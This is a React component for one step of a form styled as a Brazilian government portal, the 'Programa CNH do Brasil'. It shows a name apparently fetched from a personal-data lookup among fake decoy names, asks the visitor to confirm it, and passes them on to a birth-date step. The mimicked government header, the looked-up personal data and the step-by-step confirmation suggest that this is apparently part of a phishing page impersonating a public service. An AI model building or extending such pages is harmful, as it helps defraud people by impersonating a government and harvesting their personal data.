import { useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./StepName.css";

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function cleanStr(v) {
  return String(v || "")
    .trim()
    .replace(/\s+/g, " ")
    .toUpperCase();
}

// tenta pegar o nome em vários formatos (caso a API mude)
function pickNome(dados) {
  if (!dados) return "";
  return (
    dados.nome ||
    dados.Nome ||
    dados.nome_completo ||
    dados.NomePessoaFisica ||
    (dados.Result && (dados.Result.nome || dados.Result.NomePessoaFisica || dados.Result.Nome)) ||
    ""
  );
}

export default function StepName() {
  const location = useLocation();
  const navigate = useNavigate();

  const data = location.state;

  const [selected, setSelected] = useState("");

  const { nomeReal, nomes } = useMemo(() => {
    const real = cleanStr(pickNome(data?.dados));

    // fallback só pra não quebrar layout se vier vazio
    const safeReal = real || "NOME NÃO ENCONTRADO";

    const fakePool = [
      "MARIA PEREIRA COSTA",
      "JUNIOR OLIVEIRA",
      "ALICE SANTOS RIBEIRO",
      "JOÃO ANDRADE DA SILVA",
      "ANA CAROLINA SOUZA",
      "PAULO HENRIQUE LIMA",
      "FERNANDA OLIVEIRA MORAES",
      "GABRIEL COSTA ALMEIDA",
    ];

    const realNorm = cleanStr(safeReal);

    // remove qualquer fake que seja igual ao nome real
    const pool = fakePool.filter((n) => cleanStr(n) !== realNorm);

    // pega 3 fakes
    const fakes = pool.slice(0, 3);

    // embaralha as 4 opções
    const options = shuffle([safeReal, ...fakes]);

    return { nomeReal: safeReal, nomes: options };
  }, [data]);

  if (!data) return <div className="step-loading">Carregando...</div>;

  const goNext = () => {
    if (!selected) return;

    navigate("/stepbirth", {
      state: {
        ...data,
        nomeSelecionado: selected,
      },
    });
  };

  return (
    <div className="gov-page">
      {/* HEADER */}
      <header className="g-header">
        <div className="g-header-inner">
          <div className="g-left">
            <img className="g-logo" src="/logo.png" alt="Logo" />
            <button className="g-burger" type="button" aria-label="Menu">
              ☰
            </button>
            <a className="g-link" href="#" onClick={(e) => e.preventDefault()}>
              Programa CNH do Brasil
            </a>
          </div>

          <div className="g-right" aria-hidden="true">
            <span className="g-dot">⋮</span>
            <span className="g-circle">⦿</span>
            <span className="g-grid">⌗</span>
            <span className="g-avatar">●</span>
          </div>
        </div>
      </header>

      {/* CONTEÚDO */}
      <main className="g-main">
        <section className="g-card">
          <h1 className="g-card-title">
            Confirme seus dados para o cadastro no Programa CNH do Brasil
          </h1>

          <div className="g-steprow">
            <div className="g-stepcircle">1</div>
            <div className="g-question">Qual é seu nome completo?</div>
          </div>

          <div className="g-list" role="list">
            {nomes.map((n, idx) => {
              const active = cleanStr(selected) === cleanStr(n);
              return (
                <button
                  key={idx}
                  type="button"
                  className={`g-item ${active ? "is-active" : ""}`}
                  onClick={() => setSelected(n)}
                >
                  <span className="g-item-text">{n}</span>
                </button>
              );
            })}
          </div>

          <button
            className="g-confirm"
            type="button"
            disabled={!selected || cleanStr(nomeReal) === "NOME NÃO ENCONTRADO"}
            onClick={goNext}
          >
            Confirmar
          </button>
        </section>
      </main>
    </div>
  );
}